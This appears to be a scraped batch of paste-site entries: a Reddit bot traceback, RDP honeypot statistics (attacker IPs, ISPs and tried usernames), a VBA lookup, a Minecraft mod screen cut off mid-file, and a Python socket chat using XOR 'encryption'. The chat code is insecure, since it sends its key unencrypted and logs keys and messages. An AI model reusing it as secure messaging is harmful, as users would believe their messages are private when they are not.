  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 712, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 517, in _objectify_request
    self.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 941, in request
    return self._core.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 330, in request
    return self._request_with_retries(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 228, in _request_with_retries
    response, saved_exception = self._make_request(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 185, in _make_request
    response = self._rate_limiter.call(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/rate_limit.py"", line 33, in call
    kwargs[""headers""] = set_header_callback()
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 283, in _set_header_callback
    self._authorizer.refresh()
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/auth.py"", line 425, in refresh
    self._request_token(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/auth.py"", line 155, in _request_token
    response = self._authenticator._post(url, **data)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/auth.py"", line 38, in _post
    raise ResponseException(response)
prawcore.exceptions.ResponseException: received 503 HTTP response
"
gcnFUjhv,2024-02-22_stats.json,rdp_snitch,JSON,Thursday 22nd of February 2024 06:18:20 PM CDT,"{
  ""ip"": {
    ""185.180.143.48"": 6,
    ""87.251.75.145"": 9,
    ""120.240.145.8"": 6,
    ""103.47.194.205"": 3,
    ""205.210.31.52"": 9,
    ""185.129.51.9"": 6,
    ""45.227.254.49"": 6,
    ""194.165.16.72"": 6,
    ""45.137.201.204"": 3,
    ""185.170.144.3"": 6,
    ""77.236.64.250"": 3,
    ""98.159.37.184"": 3,
    ""205.210.31.93"": 9,
    ""123.56.20.194"": 3,
    ""36.91.222.100"": 3,
    ""212.70.149.142"": 21,
    ""167.94.138.50"": 3,
    ""152.32.227.68"": 3,
    ""147.78.47.51"": 3,
    ""46.19.139.234"": 3,
    ""205.210.31.201"": 9,
    ""80.15.71.53"": 3,
    ""45.227.254.26"": 12,
    ""62.204.41.107"": 12,
    ""82.78.61.66"": 6,
    ""27.184.195.229"": 3,
    ""87.251.75.64"": 3,
    ""167.248.133.35"": 3,
    ""45.131.195.22"": 3,
    ""205.210.31.233"": 9,
    ""173.239.214.33"": 3
  },
  ""asn"": {
    ""AS211680"": 6,
    ""AS208091"": 12,
    ""AS56040"": 6,
    ""AS140832"": 3,
    ""AS396982"": 36,
    ""AS200532"": 6,
    ""AS267784"": 18,
    ""AS48721"": 6,
    ""AS49581"": 3,
    ""AS197414"": 6,
    ""AS41034"": 3,
    ""AS62240"": 9,
    ""AS37963"": 3,
    ""AS7713"": 3,
    ""AS204428"": 21,
    ""AS398324"": 6,
    ""AS135377"": 3,
    ""AS209588"": 3,
    ""AS51852"": 3,
    ""AS3215"": 3,
    ""AS59425"": 12,
    ""AS8708"": 6,
    ""AS4134"": 3
  },
  ""isp"": {
    ""NSEC - Sistemas Informaticos, S.A."": 6,
    ""Xhost Internet Solutions LP"": 18,
    ""China Mobile communications corporation"": 6,
    ""FTECH"": 3,
    ""Google LLC"": 36,
    ""LLP \""Kompaniya Hoster.KZ\"""": 6,
    ""Flyservers S.A."": 27,
    ""Ferdinand Zink trading as Tube-Hosting"": 3,
    ""Ltd. \""SPA\""Impulse\"""": 3,
    ""LogicWeb Inc."": 6,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""PT Telekomunikasi Indonesia"": 3,
    ""SS-Net"": 21,
    ""Censys, Inc."": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Private Layer INC"": 3,
    ""France Telecom Orange"": 3,
    ""Horizon LLC"": 12,
    ""RCS & RDS"": 6,
    ""Chinanet"": 3,
    ""VPN"": 3
  },
  ""org"": {
    ""ICG 1 Inap"": 6,
    ""Xhost Internet Solutions"": 12,
    ""China Mobile"": 6,
    ""Unknown"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Hosterkz Network"": 6,
    ""UAB Host Baltic"": 18,
    ""Flyservers S.A"": 9,
    ""Taurus"": 3,
    ""Xhostis"": 6,
    ""Dedicated Servers"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""Telekomunikasi Indonesia"": 3,
    ""4Media Ltd"": 21,
    ""Censys, Inc"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Fast Serv Inc."": 3,
    ""Horizon LLC"": 12,
    ""RCS & RDS Residential"": 6,
    ""Chinanet HE"": 3,
    ""Censys, Inc."": 3,
    ""VPN-Consumer-US"": 3,
    ""NSQ-VENTURE"": 3
  },
  ""regionName"": {
    ""Illinois"": 6,
    ""North Holland"": 21,
    ""Guangdong"": 6,
    ""Thanh H\u00f3a Province"": 3,
    ""California"": 39,
    ""Karaganda"": 6,
    ""Vilnius"": 18,
    ""Kaunas"": 6,
    ""Lombardy"": 3,
    ""Perm Krai"": 3,
    ""Beijing"": 3,
    ""Jakarta"": 3,
    ""Plovdiv"": 21,
    ""Michigan"": 6,
    ""Moscow"": 15,
    ""Bern"": 3,
    ""\u00cele-de-France"": 3,
    ""Dolj"": 6,
    ""Hebei"": 3,
    ""New Jersey"": 6
  },
  ""country"": {
    ""United States"": 57,
    ""The Netherlands"": 21,
    ""China"": 12,
    ""Vietnam"": 3,
    ""Kazakhstan"": 6,
    ""Lithuania"": 24,
    ""Italy"": 3,
    ""Russia"": 18,
    ""Indonesia"": 3,
    ""Bulgaria"": 21,
    ""Switzerland"": 3,
    ""France"": 3,
    ""Romania"": 6
  },
  ""account"": {
    ""rfgwp58k"": 3,
    ""Administr"": 42,
    ""uu3k19ux"": 3,
    ""(empty)"": 24,
    ""hello"": 18,
    ""sBHHyTzFQ"": 3,
    ""WgdFNY"": 3,
    ""sjzuZC"": 3,
    ""Test"": 33,
    ""a"": 3,
    ""ebVoukCGC"": 3,
    ""RQERkS"": 3,
    ""OmGASQ"": 3,
    ""Administrator"": 3,
    ""ZljgjjteS"": 3,
    ""pFTgeq"": 3,
    ""eKbjhi"": 3,
    ""admin"": 3,
    ""Domain"": 12,
    ""reHCgxYZu"": 3,
    ""lxQUQl"": 3,
    ""vuvflZ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 180
  },
  ""client_build"": {
    ""Unknown"": 180
  },
  ""client_name"": {
    ""Unknown"": 180
  },
  ""ip_type"": {
    ""Unknown"": 114,
    ""mobile"": 6,
    ""hosting"": 51,
    ""hosting & proxy"": 9
  }
}"
9frcyaWs,2024-02-22_stats.json,rdp_snitch,JSON,Thursday 22nd of February 2024 06:16:09 PM CDT,"{
  ""ip"": {
    ""185.180.143.48"": 4,
    ""87.251.75.145"": 6,
    ""120.240.145.8"": 4,
    ""103.47.194.205"": 2,
    ""205.210.31.52"": 6,
    ""185.129.51.9"": 4,
    ""45.227.254.49"": 4,
    ""194.165.16.72"": 4,
    ""45.137.201.204"": 2,
    ""185.170.144.3"": 4,
    ""77.236.64.250"": 2,
    ""98.159.37.184"": 2,
    ""205.210.31.93"": 6,
    ""123.56.20.194"": 2,
    ""36.91.222.100"": 2,
    ""212.70.149.142"": 14,
    ""167.94.138.50"": 2,
    ""152.32.227.68"": 2,
    ""147.78.47.51"": 2,
    ""46.19.139.234"": 2,
    ""205.210.31.201"": 6,
    ""80.15.71.53"": 2,
    ""45.227.254.26"": 8,
    ""62.204.41.107"": 8,
    ""82.78.61.66"": 4,
    ""27.184.195.229"": 2,
    ""87.251.75.64"": 2,
    ""167.248.133.35"": 2,
    ""45.131.195.22"": 2,
    ""205.210.31.233"": 6,
    ""173.239.214.33"": 2
  },
  ""asn"": {
    ""AS211680"": 4,
    ""AS208091"": 8,
    ""AS56040"": 4,
    ""AS140832"": 2,
    ""AS396982"": 24,
    ""AS200532"": 4,
    ""AS267784"": 12,
    ""AS48721"": 4,
    ""AS49581"": 2,
    ""AS197414"": 4,
    ""AS41034"": 2,
    ""AS62240"": 6,
    ""AS37963"": 2,
    ""AS7713"": 2,
    ""AS204428"": 14,
    ""AS398324"": 4,
    ""AS135377"": 2,
    ""AS209588"": 2,
    ""AS51852"": 2,
    ""AS3215"": 2,
    ""AS59425"": 8,
    ""AS8708"": 4,
    ""AS4134"": 2
  },
  ""isp"": {
    ""NSEC - Sistemas Informaticos, S.A."": 4,
    ""Xhost Internet Solutions LP"": 12,
    ""China Mobile communications corporation"": 4,
    ""FTECH"": 2,
    ""Google LLC"": 24,
    ""LLP \""Kompaniya Hoster.KZ\"""": 4,
    ""Flyservers S.A."": 18,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""Ltd. \""SPA\""Impulse\"""": 2,
    ""LogicWeb Inc."": 4,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""SS-Net"": 14,
    ""Censys, Inc."": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Private Layer INC"": 2,
    ""France Telecom Orange"": 2,
    ""Horizon LLC"": 8,
    ""RCS & RDS"": 4,
    ""Chinanet"": 2,
    ""VPN"": 2
  },
  ""org"": {
    ""ICG 1 Inap"": 4,
    ""Xhost Internet Solutions"": 8,
    ""China Mobile"": 4,
    ""Unknown"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Hosterkz Network"": 4,
    ""UAB Host Baltic"": 12,
    ""Flyservers S.A"": 6,
    ""Taurus"": 2,
    ""Xhostis"": 4,
    ""Dedicated Servers"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""4Media Ltd"": 14,
    ""Censys, Inc"": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Fast Serv Inc."": 2,
    ""Horizon LLC"": 8,
    ""RCS & RDS Residential"": 4,
    ""Chinanet HE"": 2,
    ""Censys, Inc."": 2,
    ""VPN-Consumer-US"": 2,
    ""NSQ-VENTURE"": 2
  },
  ""regionName"": {
    ""Illinois"": 4,
    ""North Holland"": 14,
    ""Guangdong"": 4,
    ""Thanh H\u00f3a Province"": 2,
    ""California"": 26,
    ""Karaganda"": 4,
    ""Vilnius"": 12,
    ""Kaunas"": 4,
    ""Lombardy"": 2,
    ""Perm Krai"": 2,
    ""Beijing"": 2,
    ""Jakarta"": 2,
    ""Plovdiv"": 14,
    ""Michigan"": 4,
    ""Moscow"": 10,
    ""Bern"": 2,
    ""\u00cele-de-France"": 2,
    ""Dolj"": 4,
    ""Hebei"": 2,
    ""New Jersey"": 4
  },
  ""country"": {
    ""United States"": 38,
    ""The Netherlands"": 14,
    ""China"": 8,
    ""Vietnam"": 2,
    ""Kazakhstan"": 4,
    ""Lithuania"": 16,
    ""Italy"": 2,
    ""Russia"": 12,
    ""Indonesia"": 2,
    ""Bulgaria"": 14,
    ""Switzerland"": 2,
    ""France"": 2,
    ""Romania"": 4
  },
  ""account"": {
    ""rfgwp58k"": 2,
    ""Administr"": 28,
    ""uu3k19ux"": 2,
    ""(empty)"": 16,
    ""hello"": 12,
    ""sBHHyTzFQ"": 2,
    ""WgdFNY"": 2,
    ""sjzuZC"": 2,
    ""Test"": 22,
    ""a"": 2,
    ""ebVoukCGC"": 2,
    ""RQERkS"": 2,
    ""OmGASQ"": 2,
    ""Administrator"": 2,
    ""ZljgjjteS"": 2,
    ""pFTgeq"": 2,
    ""eKbjhi"": 2,
    ""admin"": 2,
    ""Domain"": 8,
    ""reHCgxYZu"": 2,
    ""lxQUQl"": 2,
    ""vuvflZ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 120
  },
  ""client_build"": {
    ""Unknown"": 120
  },
  ""client_name"": {
    ""Unknown"": 120
  },
  ""ip_type"": {
    ""Unknown"": 76,
    ""mobile"": 4,
    ""hosting"": 34,
    ""hosting & proxy"": 6
  }
}"
5mQem94g,2024-02-22_stats.json,rdp_snitch,JSON,Thursday 22nd of February 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""185.180.143.48"": 2,
    ""87.251.75.145"": 3,
    ""120.240.145.8"": 2,
    ""103.47.194.205"": 1,
    ""205.210.31.52"": 3,
    ""185.129.51.9"": 2,
    ""45.227.254.49"": 2,
    ""194.165.16.72"": 2,
    ""45.137.201.204"": 1,
    ""185.170.144.3"": 2,
    ""77.236.64.250"": 1,
    ""98.159.37.184"": 1,
    ""205.210.31.93"": 3,
    ""123.56.20.194"": 1,
    ""36.91.222.100"": 1,
    ""212.70.149.142"": 7,
    ""167.94.138.50"": 1,
    ""152.32.227.68"": 1,
    ""147.78.47.51"": 1,
    ""46.19.139.234"": 1,
    ""205.210.31.201"": 3,
    ""80.15.71.53"": 1,
    ""45.227.254.26"": 4,
    ""62.204.41.107"": 4,
    ""82.78.61.66"": 2,
    ""27.184.195.229"": 1,
    ""87.251.75.64"": 1,
    ""167.248.133.35"": 1,
    ""45.131.195.22"": 1,
    ""205.210.31.233"": 3,
    ""173.239.214.33"": 1
  },
  ""asn"": {
    ""AS211680"": 2,
    ""AS208091"": 4,
    ""AS56040"": 2,
    ""AS140832"": 1,
    ""AS396982"": 12,
    ""AS200532"": 2,
    ""AS267784"": 6,
    ""AS48721"": 2,
    ""AS49581"": 1,
    ""AS197414"": 2,
    ""AS41034"": 1,
    ""AS62240"": 3,
    ""AS37963"": 1,
    ""AS7713"": 1,
    ""AS204428"": 7,
    ""AS398324"": 2,
    ""AS135377"": 1,
    ""AS209588"": 1,
    ""AS51852"": 1,
    ""AS3215"": 1,
    ""AS59425"": 4,
    ""AS8708"": 2,
    ""AS4134"": 1
  },
  ""isp"": {
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""Xhost Internet Solutions LP"": 6,
    ""China Mobile communications corporation"": 2,
    ""FTECH"": 1,
    ""Google LLC"": 12,
    ""LLP \""Kompaniya Hoster.KZ\"""": 2,
    ""Flyservers S.A."": 9,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""Ltd. \""SPA\""Impulse\"""": 1,
    ""LogicWeb Inc."": 2,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""PT Telekomunikasi Indonesia"": 1,
    ""SS-Net"": 7,
    ""Censys, Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Private Layer INC"": 1,
    ""France Telecom Orange"": 1,
    ""Horizon LLC"": 4,
    ""RCS & RDS"": 2,
    ""Chinanet"": 1,
    ""VPN"": 1
  },
  ""org"": {
    ""ICG 1 Inap"": 2,
    ""Xhost Internet Solutions"": 4,
    ""China Mobile"": 2,
    ""Unknown"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Hosterkz Network"": 2,
    ""UAB Host Baltic"": 6,
    ""Flyservers S.A"": 3,
    ""Taurus"": 1,
    ""Xhostis"": 2,
    ""Dedicated Servers"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""Telekomunikasi Indonesia"": 1,
    ""4Media Ltd"": 7,
    ""Censys, Inc"": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Fast Serv Inc."": 1,
    ""Horizon LLC"": 4,
    ""RCS & RDS Residential"": 2,
    ""Chinanet HE"": 1,
    ""Censys, Inc."": 1,
    ""VPN-Consumer-US"": 1,
    ""NSQ-VENTURE"": 1
  },
  ""regionName"": {
    ""Illinois"": 2,
    ""North Holland"": 7,
    ""Guangdong"": 2,
    ""Thanh H\u00f3a Province"": 1,
    ""California"": 13,
    ""Karaganda"": 2,
    ""Vilnius"": 6,
    ""Kaunas"": 2,
    ""Lombardy"": 1,
    ""Perm Krai"": 1,
    ""Beijing"": 1,
    ""Jakarta"": 1,
    ""Plovdiv"": 7,
    ""Michigan"": 2,
    ""Moscow"": 5,
    ""Bern"": 1,
    ""\u00cele-de-France"": 1,
    ""Dolj"": 2,
    ""Hebei"": 1,
    ""New Jersey"": 2
  },
  ""country"": {
    ""United States"": 19,
    ""The Netherlands"": 7,
    ""China"": 4,
    ""Vietnam"": 1,
    ""Kazakhstan"": 2,
    ""Lithuania"": 8,
    ""Italy"": 1,
    ""Russia"": 6,
    ""Indonesia"": 1,
    ""Bulgaria"": 7,
    ""Switzerland"": 1,
    ""France"": 1,
    ""Romania"": 2
  },
  ""account"": {
    ""rfgwp58k"": 1,
    ""Administr"": 14,
    ""uu3k19ux"": 1,
    ""(empty)"": 8,
    ""hello"": 6,
    ""sBHHyTzFQ"": 1,
    ""WgdFNY"": 1,
    ""sjzuZC"": 1,
    ""Test"": 11,
    ""a"": 1,
    ""ebVoukCGC"": 1,
    ""RQERkS"": 1,
    ""OmGASQ"": 1,
    ""Administrator"": 1,
    ""ZljgjjteS"": 1,
    ""pFTgeq"": 1,
    ""eKbjhi"": 1,
    ""admin"": 1,
    ""Domain"": 4,
    ""reHCgxYZu"": 1,
    ""lxQUQl"": 1,
    ""vuvflZ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 60
  },
  ""client_build"": {
    ""Unknown"": 60
  },
  ""client_name"": {
    ""Unknown"": 60
  },
  ""ip_type"": {
    ""Unknown"": 38,
    ""mobile"": 2,
    ""hosting"": 17,
    ""hosting & proxy"": 3
  }
}"
vGfwsEnB,Minecraft,Nospes,Lua,Thursday 22nd of February 2024 06:08:33 PM CDT,"print(""HELLO WORLD ASS"")"
fQKvNxbz,Untitled,techcontraps,JSON,Thursday 22nd of February 2024 05:59:26 PM CDT,"Function GetTourTime(storeNumber As String) As Variant
    Dim ws As Worksheet
    Dim lastRow As Long
    Dim i As Long
    
    ' Set the worksheet containing the database
    Set ws = ThisWorkbook.Sheets(""StoreDatabase"")
    
    ' Find the last row in the database column A
    lastRow = ws.Cells(ws.Rows.Count, ""A"").End(xlUp).Row
    
    ' Loop through the database to find the store number
    For i = 1 To lastRow
        If ws.Cells(i, 1).Value = storeNumber Then
            ' Return the corresponding tour time
            GetTourTime = ws.Cells(i, 2).Value
            Exit Function
        End If
    Next i
    
    ' If store number not found, return an error or a message
    GetTourTime = ""Store Not Found""
End Function"
pZzp145y,server code,ItzFimes,Python,Thursday 22nd of February 2024 05:39:09 PM CDT,"import socket
import threading
import hashlib
import string
import random
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend


def receive_messages(client_socket, username):
    while True:
        try:
            data = client_socket.recv(1024)
            print(data)
            print(f""{username}: {data}"")
            broadcast(f""{username}:"", client_socket)
            broadcast(f"" {data}"", client_socket)
        except ConnectionResetError:
            print(f""[*] {username} disconnected"")
            break


def broadcast(message, sender_socket):
    for client_socket in clients:
        if client_socket != sender_socket:
            client_socket.send(message.encode())


clients = []  # Define the clients list outside the main() function


def generate_random_password(length):
    # Define the set of characters to choose from
    characters = string.ascii_letters + string.digits + string.punctuation

    # Generate a random password by selecting 'length' number of random characters
    password = ''.join(random.choice(characters) for _ in range(length))

    return password


def generate_key(password):
    # salt = b'salt_'
    # kdf = PBKDF2HMAC(
    #     algorithm=hashes.SHA256(),
    #     length=32,
    #     salt=salt,
    #     iterations=100000,
    #     backend=default_backend()
    # )
    # return kdf.derive(password.encode())
    key = generate_random_password(20) + password + generate_random_password(20)
    print(key)
    key = key.encode()
    key = bytearray(key)
    return key


def main():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    host = IPAddr
    port = 9988

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f""[*] Listening on {host}:{port}"")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f""[*] Accepted connection from {client_address}"")
        clients.append(client_socket)

        username = client_socket.recv(1024).decode()
        if len(clients) == 1:
            client_socket.send(""first_device"".encode())
            password = client_socket.recv(1024).decode()  # Receive the encryption password from the client
            password = str(password)
            key = generate_key(password)
            print(type(key))
            print(key)
            print(key)
            client_socket.send(key)
        else:
            client_socket.send(""not_first_device"".encode())
            try:
                key = key.encode()
            except:
                pass
            client_socket.send(key)  # Send the encryption key to the client

        client_handler = threading.Thread(target=receive_messages, args=(client_socket, username))
        client_handler.start()


if __name__ == ""__main__"":
    main()
"
g9eeipKd,client code,ItzFimes,Python,Thursday 22nd of February 2024 05:38:21 PM CDT,"import socket
import threading
import hashlib
import sys

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend


def decrypt_data(encrypted_data, key):
    """"""Decrypt data that was encrypted using the same key.""""""
    decrypted_data = bytearray()
    key_index = 0
    for byte in encrypted_data:
        decrypted_byte = byte ^ key[key_index]
        decrypted_data.append(decrypted_byte)
        key_index = (key_index + 1) % len(key)  # Move to the next character in the key (cyclically)
    return decrypted_data

def encrypt_message(data, key):
    """"""Encrypt data using XOR encryption with the provided key.""""""
    encrypted_data = bytearray()
    key_index = 0
    for byte in data:
        encrypted_byte = byte ^ key[key_index]
        encrypted_data.append(encrypted_byte)
        key_index = (key_index + 1) % len(key)  # Move to the next character in the key (cyclically)
    return encrypted_data


def receive_messages(client_socket, username, key):
    while True:
        try:
            username2 = client_socket.recv(1024).decode()
            username2 = str(username2)
            data = client_socket.recv(1024)
            # data = bytes(data)
            print(""\n Received encrypted data:"", data)
            print(""key:"", key)
            # data = data.decode(""utf-8"")
            # data = data.encode(""utf-8"")

            # Decrypt the received data
            dec_data = decrypt_data(data, key)
            dec_data = dec_data.decode()
            dec_data = str(dec_data)
            print(""Decrypted data:"", dec_data)

            # Print the decrypted message
            print(f""\n{username2}: "", dec_data, end=f'\n({username}) > ', flush=True)
        except ConnectionResetError as e:
            print(""[*] Disconnected from server:"", e)
            break
        except Exception as e:
            print(""Error during decryption:"", e)


def user_input(client_socket, username, key):
    while True:
        print(key)
        msg = input(f""({username}) > "")
        msg = str(msg)
        print(msg)
        encrypted_msg = encrypt_message(msg.encode(), key)
        print(encrypted_msg)
        client_socket.send(encrypted_msg)

def main():
    host = input(""Server IP: "")
    port = 9988

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    print(""[*] Connected to server"")

    username = input(""Enter your username: "")
    client_socket.send(username.encode())

    response = client_socket.recv(1024).decode()
    print(response)
    if response == ""first_device"":
        password = input(""Set encryption password: "")
        client_socket.send(password.encode())
        key = client_socket.recv(1024)
        print(type(key))
        print(key)
    else:
        print(""db"")
        key = client_socket.recv(1024)
        print(type(key))
        print(key)
    key = bytearray(key)
    print(key)

    recv_thread = threading.Thread(target=receive_messages, args=(client_socket,username, key))
    recv_thread.start()

    input_thread = threading.Thread(target=user_input, args=(client_socket, username, key))
    input_thread.daemon = True  # Set the input thread as a daemon thread
    input_thread.start()

    # Block the main thread until input thread completes
    input_thread.join()

if __name__ == ""__main__"":
    main()
"
D40QGS18,djlightlaser be screen,CreativeMasterBonin,Java,Thursday 22nd of February 2024 05:25:19 PM CDT,"package net.rk.thingamajigs.gui;

import com.mojang.blaze3d.systems.RenderSystem;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiGraphics;
import net.minecraft.client.gui.components.Button;
import net.minecraft.client.gui.screens.inventory.AbstractContainerScreen;
import net.minecraft.client.resources.sounds.SimpleSoundInstance;
import net.minecraft.core.BlockPos;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.sounds.SoundEvents;
import net.minecraft.world.entity.player.Inventory;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.level.Level;
import net.neoforged.api.distmarker.Dist;
import net.neoforged.api.distmarker.OnlyIn;
import net.neoforged.neoforge.client.gui.widget.ExtendedButton;
import net.neoforged.neoforge.client.gui.widget.ExtendedSlider;
import net.neoforged.neoforge.network.PacketDistributor;
import net.rk.thingamajigs.entity.blockentity.DJLaserLightBE;
import net.rk.thingamajigs.network.data.DJLaserLightUpdatePayload;

import java.util.HashMap;

@OnlyIn(Dist.CLIENT)
public class DJLaserLightScreen extends AbstractContainerScreen<DJLaserLightMenu> {
    private final static HashMap<String, Object> guistate = DJLaserLightMenu.guistate;
    private final Level world;
    private final int x, y, z;
    private final Player entity;

    private DJLaserLightBE djllbe;

    public Button decreaseHeightButton;
    public Button increaseHeightButton;
    public Button decVertAngleButton;
    public Button incVertAngleButton;

    public ExtendedSlider redSlider;


    private static final ResourceLocation BG_TEXTURE = new ResourceLocation(""thingamajigs:textures/gui/laser_light_menu.png"");

    public DJLaserLightScreen(DJLaserLightMenu container, Inventory inventory, Component text) {
        super(container, inventory, text);
        this.world = container.world;
        this.x = container.x;
        this.y = container.y;
        this.z = container.z;
        this.entity = container.entity;
        this.imageWidth = 320;
        this.imageHeight = 240;

        this.minecraft = Minecraft.getInstance();
        this.font = this.minecraft.font;

        int widthx = (this.width - this.imageWidth) / 2;
        int heighty = (this.height - this.imageHeight) / 2;

        this.djllbe = (DJLaserLightBE)world.getBlockEntity(new BlockPos(x,y,z)); // access the BE at the current pos that the screen is opened at
    }

    @Override
    protected void init() {
        super.init();
        setupExtras();
        addRenderableWidget(decreaseHeightButton);
        addRenderableWidget(increaseHeightButton);
        addRenderableWidget(decVertAngleButton);
        addRenderableWidget(incVertAngleButton);
        addRenderableWidget(redSlider);
    }

    @Override
    public void render(GuiGraphics pGuiGraphics, int pMouseX, int pMouseY, float pPartialTick) {
        this.renderBackground(pGuiGraphics,pMouseX,pMouseY,pPartialTick);
        super.render(pGuiGraphics, pMouseX, pMouseY, pPartialTick);


    }

    @Override
    protected void renderBg(GuiGraphics ggraph, float ptick, int mousx, int mousy) {
        RenderSystem.setShaderColor(1, 1, 1, 1);
        RenderSystem.enableBlend();
        RenderSystem.defaultBlendFunc();
        RenderSystem.setShaderTexture(0, BG_TEXTURE);
        ggraph.blit(BG_TEXTURE,
                this.leftPos,this.topPos,0,0,
                this.imageWidth,this.imageHeight,this.imageWidth,this.imageHeight);
        RenderSystem.disableBlend();
    }

    @Override
    public void containerTick() {
        super.containerTick();
    }

    @Override
    public void onClose() {
        super.onClose();
    }

    @Override
    public boolean keyPressed(int key, int b, int c) {
        if (key == 256) {
            this.minecraft.player.closeContainer();
            return true;
        }
        return super.keyPressed(key, b, c);
    }

    public void onHeightAmtChanged(String str){

    }

    // send to server all updated BE elements so the BE can be updated and saved and synced properly to all clients
    private void setupExtras(){
        //BlockPos bp,boolean customcolors,boolean randomcolors,
        //    int height,int color,float angle,float vertangle,int oscangle,int mm,float lasersize,
        //                                        float r, float g, float b, int lightmode
        decreaseHeightButton = new ExtendedButton(this.leftPos + 23, this.topPos + 24,
                32, 16, Component.translatable(""button.thingamajigs.laser_light.height_dec""),
                (b0s) -> {
                    PacketDistributor.SERVER.noArg().send(new DJLaserLightUpdatePayload(
                            new BlockPos(x,y,z),
                            djllbe.useCustomColor,djllbe.randomlyGenerateColor,
                            djllbe.height - 1,djllbe.color,
                            djllbe.angle,djllbe.verticalAngle,
                            djllbe.oscAngle,djllbe.degreeOfMotionMultiplier,
                            djllbe.laserSize,
                            djllbe.red,
                            djllbe.green,
                            djllbe.blue,
                            djllbe.lightMode
                            ));
                    Minecraft.getInstance().getSoundManager().play(SimpleSoundInstance.forUI(SoundEvents.ITEM_PICKUP,0.8F));
                });

        increaseHeightButton = new ExtendedButton(decreaseHeightButton.getX() + decreaseHeightButton.getWidth() + 2, decreaseHeightButton.getY(),
                32, 16, Component.translatable(""button.thingamajigs.laser_light.height_inc""),
                (b0s) -> {
                    PacketDistributor.SERVER.noArg().send(new DJLaserLightUpdatePayload(
                            new BlockPos(x,y,z),
                            djllbe.useCustomColor,djllbe.randomlyGenerateColor,
                            djllbe.height + 1,djllbe.color,
                            djllbe.angle,djllbe.verticalAngle,
                            djllbe.oscAngle,djllbe.degreeOfMotionMultiplier,
                            djllbe.laserSize,
                            djllbe.red,
                            djllbe.green,
                            djllbe.blue,
                            djllbe.lightMode
                    ));
                    Minecraft.getInstance().getSoundManager().play(SimpleSoundInstance.forUI(SoundEvents.ITEM_PICKUP,1.0F));
                });

        decVertAngleButton = new ExtendedButton(this.leftPos + 23, decreaseHeightButton.getY() + decreaseHeightButton.getHeight() + 2,
                32, 16, Component.translatable(""button.thingamajigs.laser_light.height_inc""),
                (b0s) -> {
                    PacketDistributor.SERVER.noArg().send(new DJLaserLightUpdatePayload(
                            new BlockPos(x,y,z),
                            djllbe.useCustomColor,djllbe.randomlyGenerateColor,
                            djllbe.height,djllbe.color,
                            djllbe.angle,djllbe.verticalAngle - 1,
                            djllbe.oscAngle,djllbe.degreeOfMotionMultiplier,
                            djllbe.laserSize,
                            djllbe.red,
                            djllbe.green,
                            djllbe.blue,
                            djllbe.lightMode
                    ));
                    Minecraft.getInstance().getSoundManager().play(SimpleSoundInstance.forUI(SoundEvents.ITEM_PICKUP,1.0F));
                });

